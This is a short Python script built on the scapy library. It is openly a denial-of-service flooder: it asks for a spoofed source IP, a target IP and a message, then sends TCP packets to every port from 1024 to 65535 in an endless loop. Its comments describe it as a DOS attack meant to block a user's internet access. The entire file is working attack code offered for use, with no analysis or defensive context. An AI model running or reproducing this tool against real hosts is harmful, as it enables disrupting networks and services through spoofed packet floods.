#!/usr/bin/python

from scapy.all import *

def synFlood(src,tgt,message):
	for dport in range(1024,65535):
		IPlayer = IP(src=src, dst=tgt)
		TCPlayer = TCP(sport=4444, dport=dport)
		RAWlayer = Raw(load=message)
		pkt = IPlayer/TCPlayer/RAWlayer
		send(pkt)
#sends message to every port between 1024 to 65535 and spams it or blocks it..DOS attack

source = raw_input("[*] Enter source IP Address tot fake: ")
target = raw_input("[*] Enter targets IP address: ")
message = raw_input("[*] Enter the message for TCP playload: ")


while True:
	synFlood(source,target,message)
#can send packets to port 80 and do not allow the user to use internet

